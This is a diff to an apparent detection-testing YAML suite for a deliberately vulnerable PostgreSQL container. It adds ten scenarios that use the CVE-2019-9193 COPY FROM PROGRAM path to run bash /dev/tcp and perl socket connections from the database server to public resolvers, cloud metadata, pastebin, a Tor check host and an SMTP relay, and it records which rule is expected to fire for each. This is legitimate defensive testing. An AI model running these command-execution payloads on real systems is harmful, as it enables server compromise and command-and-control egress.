@@ -57,11 +57,14 @@ attacks:
     type: cmdinject
     exec:
       command: ["pg_dump", "-h", "pg-vuln", "-d", "app", "--schema-only"]
-    expectedDetections:
-      - ruleID: R0001
-        ruleName: Unexpected process launched
-        containerName: pg-vuln-client
-        command: pg_dump
+    # pg_dump IS in pg-vuln-client's baseline profile (functional tests
+    # exercise it heavily across many flag variants). R0001 only fires on
+    # processes NOT in the profile, so this assertion was unsatisfiable
+    # and produced a stable score=1 miss in CI. Same root cause as the
+    # postgres client suite (see postgres-attacks.yaml). The attack still
+    # runs as a behaviour probe; there's no profile-side detection signal
+    # for a legitimate admin operation.
+    expectedDetections: []
 
   # T1082 — System Information Discovery: hostname (COPY FROM PROGRAM)
   - name: cve-recon-hostname
@@ -509,6 +512,159 @@ attacks:
     successIndicators:
       - bodyContains: "tables_destroyed"
     expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 13: SERVER-SIDE NETWORK ENDPOINT DETECTION (TA0011 C2 / TA0010 Exfil)
+  #
+  # 10 attacks that abuse the CVE-2019-9193 COPY FROM PROGRAM superuser
+  # path to make the pg-vuln SERVER container issue outbound connections
+  # to destinations NOT in its learned NetworkNeighborhood. The CHILD
+  # process spawned by postgres inherits the server's network namespace,
+  # so its connect() syscalls register against pg-vuln's egress and miss
+  # the egress set → R0005 ("DNS Anomalies in container") fires on the
+  # `postgres` container.
+  #
+  # The pg-vuln server image has bash + perl + getent (no python3, no
+  # curl), so we use `bash -c 'exec 3<>/dev/tcp/HOST/PORT'` for direct
+  # TCP connects and `perl -MSocket` for resolver-then-connect patterns.
+  # `getent hosts X` alone is NOT enough — it only queries CoreDNS (in
+  # egress); the follow-up connect to the resolved IP is what fires R0005.
+  #
+  # See pkg/AUTOTUNING.md → "Network Endpoint Capture" for the contract.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1071.004 — DNS to Cloudflare resolver (direct TCP to 1.1.1.1:53)
+  - name: server-endpoint-cloudflare-dns
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/1.1.1.1/53\" && echo ep_cloudflare_dns_ok || echo ep_cloudflare_dns_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_cloudflare_dns_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1071.004 — DNS to Google public resolver
+  - name: server-endpoint-google-dns
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/8.8.8.8/53\" && echo ep_google_dns_ok || echo ep_google_dns_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_google_dns_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1071.004 — DNS to Quad9 (privacy-focused public resolver)
+  - name: server-endpoint-quad9-dns
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/9.9.9.9/53\" && echo ep_quad9_dns_ok || echo ep_quad9_dns_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_quad9_dns_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1571 — Non-Standard Port: HTTPS to public IP
+  - name: server-endpoint-public-https
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/1.1.1.1/443\" && echo ep_public_https_ok || echo ep_public_https_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_public_https_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1552.005 — Cloud Instance Metadata API (SSRF target)
+  # connect() syscall fires before timeout / refusal returns, so the
+  # OUTGOING packet to 169.254.169.254 registers in pg-vuln's flow set
+  # regardless of whether the metadata service is actually reachable.
+  - name: server-endpoint-cloud-metadata
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 2 bash -c \"exec 3<>/dev/tcp/169.254.169.254/80\" >/dev/null 2>&1; echo ep_metadata_attempted'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_metadata_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1071.001 — Application Layer Protocol: Web (HTTPS to public domain)
+  - name: server-endpoint-pastebin
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/pastebin.com/443\" && echo ep_pastebin_ok || echo ep_pastebin_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_pastebin_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1090.003 — Multi-hop Proxy: Tor check endpoint (perl resolver + connect)
+  - name: server-endpoint-perl-tor
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'perl -MSocket -e \"alarm 3; my $a = inet_aton(q[check.torproject.org]) or exit 0; socket(S,PF_INET,SOCK_STREAM,getprotobyname(q[tcp])); connect(S, sockaddr_in(443, $a)) and print qq[ep_tor_ok\\n]; close(S);\" 2>&1; echo ep_tor_attempted'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_tor_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1071.001 — Application Layer Protocol: Web (raw HTTP to example.com:80)
+  - name: server-endpoint-public-http
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/example.com/80\" && echo ep_public_http_ok || echo ep_public_http_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_public_http_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1571 — Non-Standard Port: SMTP to public mail relay
+  - name: server-endpoint-public-smtp
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'timeout 3 bash -c \"exec 3<>/dev/tcp/aspmx.l.google.com/25\" && echo ep_smtp_ok || echo ep_smtp_failed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_smtp_ok"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
+
+  # T1071.001 — Application Layer Protocol: Web (one.one.one.one HTTPS via perl resolver)
+  - name: server-endpoint-perl-one-one
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS cmd_out(line text); TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'perl -MSocket -e \"alarm 3; my $a = inet_aton(q[one.one.one.one]) or exit 0; socket(S,PF_INET,SOCK_STREAM,getprotobyname(q[tcp])); connect(S, sockaddr_in(443, $a)) and print qq[ep_one_one_ok\\n]; close(S);\" 2>&1; echo ep_one_one_attempted'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "ep_one_one_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: postgres
 
   # ═══════════════════════════════════════════════════════════════════════════
   # CVE-BASED ATTACKS — Historical PostgreSQL vulnerabilities (SQL only)
